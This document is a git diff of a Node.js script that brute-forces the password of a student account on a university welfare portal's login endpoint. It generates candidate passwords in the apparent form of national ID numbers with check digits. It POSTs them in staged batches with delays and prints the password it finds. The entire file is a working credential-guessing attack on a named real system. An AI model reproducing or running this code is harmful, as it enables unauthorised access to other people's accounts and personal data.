@@ -1,8 +1,10 @@
 const rq = require("request-promise-native");
 var request = require("request");
 
-const cityCode = "372";
-const userId = "9728103";
+const cityCode = "-"; // id's City Code
+const userId = "-"; // Student id
+const LEVEL = [500, 10, 1];
+const SLEEP = [5000, 500, 200];
 let J_S3$$ion = "";
 let c$rf = "";
 // const start = parseInt(process.argv[2]);
@@ -50,7 +52,7 @@ async function get_1n1t1al_JS3$_c$rf() {
   });
 }
 
-async function post_Js3c(user) {
+async function post_Js3c(user, cb) {
   var options = {
     method: "POST",
     url: "http://refahi.kntu.ac.ir/j_security_check",
@@ -73,55 +75,54 @@ async function post_Js3c(user) {
   request(options, function (error, response) {
     if (error) return null;
     if (response.headers["set-cookie"]) {
-      return {
-        JSESSION: response.headers["set-cookie"][0].substring(0, 43),
-        USERNAME: options.form.username,
-        PASSWORD: options.form.password,
-      };
+      cb(user.id);
     }
   });
 }
 
-async function main() {
-  let id = 0;
+async function levelBruteForce(from, to, level) {
   await get_1n1t1al_JS3$_c$rf();
 
-  for (let j = 166; j < 169; j++) {
-    for (let i = id + 500 * j; i < id + 500 * (j + 1); i++) {
-      let idWithoutControll = cityCode + zeroPad(i, 6);
-      let validId = idWithoutControll + controllGenerator(idWithoutControll);
-      if (post_Js3c({ name: userId, pass: validId })) {
-        console.log(i);
-        break;
-      }
-    }
-    console.log(`from ${500 * j} to ${500 * (j + 1)} `);
-    await sleep(5000);
-  }
-  console.log(id);
-  for (let j = 0; j < 50; j++) {
-    for (let i = id + 10 * j; i < id + 10 * (j + 1); i++) {
-      let idWithoutControll = cityCode + zeroPad(i, 6);
-      let validId = idWithoutControll + controllGenerator(idWithoutControll);
-      if (post_Js3c({ name: userId, pass: validId })) {
-        id = i;
-        break;
-      }
-    }
-    console.log(`from ${id + 10 * j} to ${id + 10 * (j + 1)} `);
-    await sleep(200);
-  }
-
-  for (let i = id; i < id + 10; i++) {
-    let idWithoutControll = cityCode + zeroPad(i, 6);
+  let isDone = false;
+  let group = 0;
+  if (level > 2) {
+    let idWithoutControll = cityCode + zeroPad(from, 6);
     let validId = idWithoutControll + controllGenerator(idWithoutControll);
-    if (post_Js3c({ name: userId, pass: validId })) {
-      id = i;
-      break;
-    }
-    console.log(`id : ${i} `);
-    await sleep(200);
+    return validId;
   }
+  for (let j = 0; j < (to - from) / LEVEL[level]; j++) {
+    for (
+      let i = from + LEVEL[level] * j;
+      i < from + LEVEL[level] * (j + 1);
+      i++
+    ) {
+      let idWithoutControll = cityCode + zeroPad(i, 6);
+      let validId = idWithoutControll + controllGenerator(idWithoutControll);
+      post_Js3c(
+        {
+          name: userId,
+          pass: validId,
+          id: from + LEVEL[level] * j,
+        },
+        (id) => {
+          isDone = true;
+          group = id;
+        }
+      );
+    }
+    console.log(
+      `from ${from + LEVEL[level] * j} to ${from + LEVEL[level] * (j + 1)} `
+    );
+    await sleep(SLEEP[level]);
+    if (isDone) {
+      return levelBruteForce(group, group + LEVEL[level], level + 1);
+    }
+  }
+}
+
+async function main() {
+  let id = await levelBruteForce(0, 1000000, 0);
+  console.log("PASS : " + id);
 }
 
 main();
